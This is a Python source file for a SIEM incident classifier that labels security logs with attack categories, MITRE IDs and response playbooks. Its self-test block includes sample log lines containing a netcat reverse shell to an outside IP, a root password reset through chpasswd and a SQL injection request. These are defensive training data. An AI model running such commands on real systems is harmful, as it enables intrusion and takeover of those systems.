# File: src/incident_classifier.py
# Description: Production-Grade Multi-Class SIEM Incident Taxonomy & Root Cause Classifier Engine
# Architecture: High-Throughput Scikit-Learn Ensemble Pipeline with Character-Level N-Gram TF-IDF Vectorization

import re
import os
import joblib
import numpy as np
from typing import Dict, List, Any, Union, Tuple
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.pipeline import Pipeline

from config.incident_config import config
from src.preprocessor import LogPreprocessor


class SIEMIncidentClassifier:
    """
    SIEM Incident Taxonomy & Root Cause Classifier Engine.
    
    500K+ log ölçeğinde yüksek doğruluk ve hız ile çalışan,
    karakter seviyesinde N-Gram TF-IDF ve Random Forest Ensemble
    mimarisine dayalı sınıflama motoru.
    """
    def __init__(self, n_estimators: int = None, max_features: int = None):
        self.preprocessor = LogPreprocessor()
        
        # Hiperparametreleri konfigürasyondan veya dinamik parametrelerden al
        self.n_estimators = n_estimators or config.model.N_ESTIMATORS
        self.max_features = max_features or config.features.MAX_FEATURES
        
        # TF-IDF Metin Vektörleştirici
        self.vectorizer = TfidfVectorizer(
            analyzer=config.features.ANALYZER,
            ngram_range=config.features.NGRAM_RANGE,
            max_features=self.max_features,
            sublinear_tf=config.features.SUBLINEAR_TF,
            min_df=config.features.MIN_DF,
            max_df=config.features.MAX_DF,
            norm=config.features.NORM,
            strip_accents=config.features.STRIP_ACCENTS
        )
        
        # CPU Multi-threaded Random Forest Model
        self.model = RandomForestClassifier(
            n_estimators=self.n_estimators,
            max_depth=config.model.MAX_DEPTH,
            min_samples_split=config.model.MIN_SAMPLES_SPLIT,
            min_samples_leaf=config.model.MIN_SAMPLES_LEAF,
            criterion=config.model.CRITERION,
            class_weight=config.model.CLASS_WEIGHT,
            n_jobs=config.model.N_JOBS,
            random_state=config.model.RANDOM_STATE,
            verbose=config.model.VERBOSE
        )
        
        self.is_fitted: bool = False
        self.classes_: np.ndarray = np.array([])

    def fit(self, raw_logs: List[str], labels: List[str]) -> "SIEMIncidentClassifier":
        """
        Ham log listesi ve karşılık gelen etiketler üzerinde model eğitimini gerçekleştirir.
        """
        print(f"⚙️ [INCIDENT CLASSIFIER] {len(raw_logs):,} adet log ön işlemeden geçiriliyor...")
        cleaned_logs = self.preprocessor.transform_batch(raw_logs)
        
        print(f"📐 [INCIDENT CLASSIFIER] TF-IDF Matrisi oluşturuluyor (Max Features: {self.max_features:,})...")
        X = self.vectorizer.fit_transform(cleaned_logs)
        y = np.array(labels)
        
        print(f"🏋️ [INCIDENT CLASSIFIER] {X.shape[0]:,} örnek x {X.shape[1]:,} öznitelik matrisinde "
              f"{self.n_estimators} Karar Ağacı ile CPU eğitimi başlatılıyor...")
        
        self.model.fit(X, y)
        self.classes_ = self.model.classes_
        self.is_fitted = True
        
        print("✅ [INCIDENT CLASSIFIER] Model eğitimi başarıyla tamamlandı!")
        return self

    def predict_single(self, raw_log: str) -> Dict[str, Any]:
        """
        Tek bir ham log satırını sınıflandırır, kök neden analizi ve müdahale adımlarını üretir.
        """
        if not self.is_fitted:
            raise RuntimeError("Model henüz eğitilmedi veya yüklenmedi! Lütfen önce 'fit' veya 'load' çağırın.")

        cleaned_log = self.preprocessor.clean_single_log(raw_log)
        metadata = self.preprocessor.extract_log_metadata(raw_log)
        
        X = self.vectorizer.transform([cleaned_log])
        probabilities = self.model.predict_proba(X)[0]
        
        best_idx = int(np.argmax(probabilities))
        category = str(self.classes_[best_idx])
        confidence = float(probabilities[best_idx]) * 100.0

        # Sınıf bazlı olasılık dağılımı haritası
        prob_dict = {
            str(cls): round(float(prob) * 100.0, 2)
            for cls, prob in zip(self.classes_, probabilities)
        }

        # Konfigürasyondan Playbook ve Metadataları Çek
        taxonomy_info = config.taxonomy.CATEGORIES.get(category, {
            "title": "Bilinmeyen Olay / Tanımsız Trafik",
            "mitre_id": "T1082",
            "mitre_name": "System Information Discovery",
            "playbook": "1. Genel SOC incelemesi başlatın.\n2. Varlık log geçmişini analiz edin.",
            "urgency": "INFO",
            "base_risk_weight": 0.0
        })

        return {
            "predicted_category": category,
            "confidence": round(confidence, 2),
            "probabilities": prob_dict,
            "taxonomy": {
                "title": taxonomy_info["title"],
                "mitre_id": taxonomy_info["mitre_id"],
                "mitre_name": taxonomy_info["mitre_name"],
                "urgency": taxonomy_info["urgency"],
                "playbook": taxonomy_info["playbook"],
                "base_risk_weight": taxonomy_info["base_risk_weight"]
            },
            "log_metadata": metadata,
            "cleaned_log": cleaned_log
        }

    def predict_batch(self, raw_logs: List[str]) -> List[Dict[str, Any]]:
        """
        Toplu log listesi üzerinde hızlı çıkarım yapıp sonuç listesini döner.
        """
        if not self.is_fitted:
            raise RuntimeError("Model henüz eğitilmedi veya yüklenmedi!")

        cleaned_logs = self.preprocessor.transform_batch(raw_logs)
        X = self.vectorizer.transform(cleaned_logs)
        prob_matrix = self.model.predict_proba(X)
        
        results = []
        for idx, probabilities in enumerate(prob_matrix):
            best_idx = int(np.argmax(probabilities))
            category = str(self.classes_[best_idx])
            confidence = float(probabilities[best_idx]) * 100.0
            
            taxonomy_info = config.taxonomy.CATEGORIES.get(category, {
                "title": "Bilinmeyen Olay",
                "mitre_id": "T1082",
                "urgency": "INFO",
                "playbook": "SOC İncelemesi Başlatın."
            })
            
            results.append({
                "log_index": idx,
                "predicted_category": category,
                "confidence": round(confidence, 2),
                "title": taxonomy_info["title"],
                "mitre_id": taxonomy_info["mitre_id"],
                "urgency": taxonomy_info["urgency"]
            })
            
        return results

    def save(self, filepath: str = None) -> str:
        """
        Modeli ve Vektörleştiriciyi disk üzerine atomik olarak kaydeder.
        """
        target_path = filepath or config.paths.MODEL_FILE
        os.makedirs(os.path.dirname(target_path), exist_ok=True)
        
        save_dict = {
            "vectorizer": self.vectorizer,
            "model": self.model,
            "classes_": self.classes_,
            "is_fitted": self.is_fitted,
            "n_estimators": self.n_estimators,
            "max_features": self.max_features
        }
        
        joblib.dump(save_dict, target_path, compress=3)
        print(f"💾 [INCIDENT CLASSIFIER] Model başarıyla kaydedildi: {target_path}")
        return target_path

    @classmethod
    def load(cls, filepath: str = None) -> "SIEMIncidentClassifier":
        """
        Disk üzerindeki kayıtlı modeli yükler.
        """
        target_path = filepath or config.paths.MODEL_FILE
        if not os.path.exists(target_path):
            raise FileNotFoundError(f"Kayıtlı model dosyası bulunamadı: {target_path}")

        saved_data = joblib.load(target_path)
        
        instance = cls(
            n_estimators=saved_data.get("n_estimators", config.model.N_ESTIMATORS),
            max_features=saved_data.get("max_features", config.features.MAX_FEATURES)
        )
        instance.vectorizer = saved_data["vectorizer"]
        instance.model = saved_data["model"]
        instance.classes_ = saved_data["classes_"]
        instance.is_fitted = saved_data["is_fitted"]
        
        print(f"📦 [INCIDENT CLASSIFIER] Model diskten yüklendi: {target_path}")
        return instance


# Doğrulama Testi
if __name__ == "__main__":
    test_logs = [
        "Aug 13 12:00:11 srv-web-prod01 bash[30100]: Executed: /bin/nc -e /bin/bash 194.26.29.112 4444",
        "Aug 13 12:01:13 srv-db-node02 bash[30200]: Executed: echo 'root:p@ssw0rd123!' | /usr/sbin/chpasswd",
        "Aug 13 12:02:11 srv-app-cluster01 nginx[2200]: 194.26.29.112 - - 'GET /page.php?id=1'%20UNION%20SELECT%20null--",
        "Aug 13 12:07:09 srv-k8s-worker3 auditd[850]: exe='/memfd:malicious (deleted)' key='memfd_exec'"
    ]
    test_labels = ["NETWORK_C2", "SYSTEM_INTEGRITY", "APPLICATION_EXPLOIT", "PROCESS_INJECTION"]

    print("--- INCIDENT CLASSIFIER VERIFICATION ---")
    classifier = SIEMIncidentClassifier(n_estimators=10, max_features=1000)
    classifier.fit(test_logs, test_labels)
    
    pred = classifier.predict_single(test_logs[0])
    print(f"\nSample Prediction Results:\nCategory   : {pred['predicted_category']} ({pred['confidence']}%)")
    print(f"Title      : {pred['taxonomy']['title']}")
    print(f"Playbook   :\n{pred['taxonomy']['playbook']}")